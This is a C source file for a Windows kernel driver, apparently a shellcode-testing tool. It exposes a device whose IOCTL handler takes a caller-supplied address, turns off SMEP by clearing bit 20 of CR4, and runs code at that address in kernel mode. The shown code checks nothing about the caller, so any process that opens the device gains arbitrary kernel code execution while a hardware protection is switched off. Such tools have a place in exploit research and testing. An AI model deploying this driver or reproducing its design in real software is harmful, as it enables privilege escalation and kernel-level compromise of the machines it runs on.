#include <ntddk.h>
#include <intrin.h>

#include "shellcodedriver.h"

DRIVER_INITIALIZE DriverEntry;
DRIVER_DISPATCH SCDCreateClose;
DRIVER_DISPATCH SCDDeviceControl;
DRIVER_UNLOAD SCDUnloadDriver;

#ifdef ALLOC_PRAGMA
#pragma alloc_text( INIT, DriverEntry )
#pragma alloc_text( PAGE, SCDCreateClose)
#pragma alloc_text( PAGE, SCDDeviceControl)
#pragma alloc_text( PAGE, SCDUnloadDriver) 
#endif // ALLOC_PRAGMA

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING RegistryPath)
{
	NTSTATUS retStatus = STATUS_SUCCESS;
	UNICODE_STRING ntUnicodeString = { 0 };
	UNICODE_STRING dosUnicodeString = { 0 };
	PDEVICE_OBJECT pDeviceObject = NULL;

	UNREFERENCED_PARAMETER(RegistryPath);

	RtlInitUnicodeString(&ntUnicodeString, NT_DEVICE_NAME);

	retStatus = IoCreateDevice(pDriverObject, 0, &ntUnicodeString, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &pDeviceObject);

	if (NT_SUCCESS(retStatus))
	{
		pDriverObject->MajorFunction[IRP_MJ_CREATE] = SCDCreateClose;
		pDriverObject->MajorFunction[IRP_MJ_CLOSE] = SCDCreateClose;
		pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = SCDDeviceControl;
		pDriverObject->DriverUnload = SCDUnloadDriver;

		RtlInitUnicodeString(&dosUnicodeString, DOS_DEVICE_NAME);

		retStatus = IoCreateSymbolicLink(&dosUnicodeString, &ntUnicodeString);

		if (!NT_SUCCESS(retStatus))
			IoDeleteDevice(pDeviceObject);
	}

	return retStatus;
}

NTSTATUS SCDCreateClose(PDEVICE_OBJECT pDeviceObject, PIRP Irp)
{
	UNREFERENCED_PARAMETER(pDeviceObject);

	PAGED_CODE();

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

VOID SCDUnloadDriver(_In_ PDRIVER_OBJECT DriverObject)
{
	PDEVICE_OBJECT pDeviceObject = DriverObject->DeviceObject;
	UNICODE_STRING dosDeviceName;

	RtlInitUnicodeString(&dosDeviceName, DOS_DEVICE_NAME);

	IoDeleteSymbolicLink(&dosDeviceName);

	if (pDeviceObject != NULL)
		IoDeleteDevice(pDeviceObject);
}


#pragma warning(push)
#pragma warning(disable:4055)

VOID SCDExecuteShellcode(char *shellcode)
{
	unsigned long long cr4 = 0;
	shellcode_function_t pFunc = (shellcode_function_t)shellcode;
	MmGetSystemRoutineAddress_t pArg = MmGetSystemRoutineAddress;

	cr4 = __readcr4();
	__writecr4(cr4 ^ (cr4 & (1 << 20))); // disable SMEP

	pFunc(pArg);

	__writecr4(cr4);
}

#pragma warning(pop)

NTSTATUS SCDDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	ULONG nBufLen = 0;
	PSCD_IOCTL_IN_BUFFER inBuf = NULL;
	PIO_STACK_LOCATION  irpSp = NULL;
	NTSTATUS ntStatus = STATUS_INVALID_DEVICE_REQUEST;

	UNREFERENCED_PARAMETER(DeviceObject);

	PAGED_CODE();

	irpSp = IoGetCurrentIrpStackLocation(Irp);
	
	if (irpSp->Parameters.DeviceIoControl.IoControlCode == SCD_EXEC_IOCTL_BUFFERED)
	{
		nBufLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;

		ntStatus = STATUS_INVALID_BUFFER_SIZE;
		if (nBufLen == sizeof(void*))
		{
			inBuf = (PSCD_IOCTL_IN_BUFFER)Irp->AssociatedIrp.SystemBuffer;

			DbgPrint("Executing code at %p", inBuf);
			SCDExecuteShellcode(inBuf->ShellcodeAddress);
			ntStatus = STATUS_SUCCESS;
		}
	}

	Irp->IoStatus.Status = ntStatus;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return ntStatus;
}